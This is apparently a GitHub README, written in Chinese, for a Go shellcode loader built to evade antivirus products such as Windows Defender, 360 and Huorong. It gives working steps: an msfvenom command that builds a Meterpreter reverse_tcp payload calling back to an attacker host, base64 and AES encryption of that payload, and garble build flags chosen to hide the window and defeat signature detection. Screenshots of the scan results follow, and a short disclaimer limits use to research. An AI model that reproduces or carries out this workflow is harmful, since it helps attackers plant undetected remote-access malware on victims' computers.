# go-shellcode-loader

GO混淆免杀shellcode加载器AES加密

混淆反检测 过DF、360和火绒


#### 获取项目

```Bash
git clone https://github.com/HZzz2/go-shellcode-loader.git
cd go-shellcode-loader
//下条命令安装第三方混淆库  GitHub地址：https://github.com/burrowers/garble
go install mvdan.cc/garble@latest    

```

#### 生成shellcode并base64

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw`

`base64 -w 0 -i rev.raw > rev.bs64`

`cat rev.bs64`

**复制到aes-sc.go中的51行替换payload**

运行aes-sc.go生成AES加密后的值

`go run aes_sc.go`

复制输出的值到go-sc.go中的73行替换payload

#### **编译成exe可执行程序**

`garble -tiny -literals -seed=random build -ldflags="-w -s -H windowsgui" -race go-sc.go`

参数解释：

  garble(混淆库)：
                          
                          -tiny                    删除额外信息
                          
                          -literals               混淆文字

                          -seed=random   base64编码的随机种子 

  go：
        
        -w                        去掉调试信息，不能gdb调试了

        -s                         去掉符号表

        -H windowsgui    隐藏执行窗口，不占用 cmd 终端。 （被查杀率高）

        -race                    使数据允许竞争检测，编译时改变了生成后的文件特征， 使得杀软无法检测，当然有一天也会失效的。

编译后得到go-sc.exe

#### 检测图

**火绒**

![image](https://user-images.githubusercontent.com/22775890/172315590-c32aa9ad-0b2b-43cd-a96c-45d971a83ef5.png)


**360杀毒**

![image](https://user-images.githubusercontent.com/22775890/172315610-9bfa9d41-31a1-42d5-bd54-b0ce3e73318d.png)


**360卫士**

![image](https://user-images.githubusercontent.com/22775890/172315642-73266f42-6019-42b7-bb02-5dd59b0925b7.png)



**DF**

![image](https://user-images.githubusercontent.com/22775890/172315670-89a23a36-5e1f-40e8-b311-a4a22490d1ca.png)



**virustotal**

![image](https://user-images.githubusercontent.com/22775890/172315706-4fbd57a6-0e14-497a-af91-ea6c7cdf0704.png)



**微步云杀箱**

![image](https://user-images.githubusercontent.com/22775890/172315732-84eb7a75-481c-4904-a341-bd96a336ad87.png)




**运行效果**




https://user-images.githubusercontent.com/22775890/172315782-707cfbbb-90ed-4156-97d8-dcaf0da8a554.mp4


## 免责声明
仅供安全研究与教学之用，如果使用者将其做其他用途，由使用者承担全部法律及连带责任，本人不承担任何法律及连带责任。
